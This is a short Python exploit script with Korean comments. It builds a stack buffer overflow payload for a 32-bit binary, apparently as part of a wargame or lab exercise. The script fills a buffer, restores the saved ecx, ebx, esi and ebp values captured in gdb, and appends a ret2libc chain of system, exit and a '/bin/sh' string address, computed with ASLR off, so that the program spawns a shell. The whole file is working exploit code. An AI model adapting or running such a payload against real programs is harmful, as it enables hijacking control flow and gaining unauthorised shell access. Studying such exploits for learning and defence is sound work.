#!/usr/bin/env python3
import sys
from struct import pack

# ---- (A) gdb에서 주워온 값 (main+16 시점) ----
ECX = 0xffffcee0
EBX = 0xf7fa5e34
ESI = 0xffffcf9c

# ---- (B) ASLR OFF에서 계산한 ret2libc 주소들 ----
LIBC_BASE = 0xf7d75000
SYSTEM = LIBC_BASE + 0x050430
EXIT   = LIBC_BASE + 0x03ebd0
BINSH  = LIBC_BASE + 0x1c4de8

# ---- (C) 레이아웃 계산 ----
# buf = [ebp-0x2c]
# saved ecx slot = [ebp-0x0c]
# 따라서 buf->saved_ecx 까지 = 0x2c - 0x0c = 0x20 (32 bytes)
BUF_TO_SAVED_ECX = 0x20

# 체인을 깔 위치는 [ecx-4] ([ebp+0x4]가 아니므로 별도의 계산 필요)
# buf 시작(대략)은 [ebp-0x2c] = 0xffffce9c (캡처 기준)
BUF_ADDR = 0xffffcec8 - 0x2c  # ebp(캡처) - 0x2c = 0xffffce9c
CHAIN_ADDR = ECX - 4          # 0xffffcedc
BUF_TO_CHAIN = CHAIN_ADDR - BUF_ADDR  # 0x40

# ---- (D) payload 만들기 ----
payload = b"A" * BUF_TO_CHAIN

# 이제 buf로 덮어쓴 영역 중,
# [ebp-0x0c],[ebp-0x08],[ebp-0x04],[ebp] 위치에 들어갈 값도 맞춰야 함.
# BUF_TO_CHAIN(0x40) 안에 이미 그 슬롯들이 포함되어 있으니,
# 정확히 그 오프셋에 값이 들어가도록 "패치"해준다.

payload = bytearray(payload)

# buf 기준 오프셋
off_saved_ecx = BUF_TO_SAVED_ECX          # 0x20 -> [ebp-0x0c]
off_saved_ebx = BUF_TO_SAVED_ECX + 4      # 0x24 -> [ebp-0x08]
off_saved_esi = BUF_TO_SAVED_ECX + 8      # 0x28 -> [ebp-0x04]
off_saved_ebp = BUF_TO_SAVED_ECX + 12     # 0x2c -> [ebp]

payload[off_saved_ecx:off_saved_ecx+4] = pack("<I", ECX)
payload[off_saved_ebx:off_saved_ebx+4] = pack("<I", EBX)
payload[off_saved_esi:off_saved_esi+4] = pack("<I", ESI)
payload[off_saved_ebp:off_saved_ebp+4] = pack("<I", 0x0)   # ebp는 크게 안 중요

# 이제 ret이 읽을 위치(ecx-4 = CHAIN_ADDR)에 ret2libc 체인을 둔다.
# CHAIN_ADDR는 buf 시작으로부터 BUF_TO_CHAIN만큼 떨어진 지점이며,
# payload의 끝부분(지금 딱 그 위치)에 체인을 append하면 된다.
payload = bytes(payload)
payload += pack("<I", SYSTEM)
payload += pack("<I", EXIT)
payload += pack("<I", BINSH)

sys.stdout.buffer.write(payload)
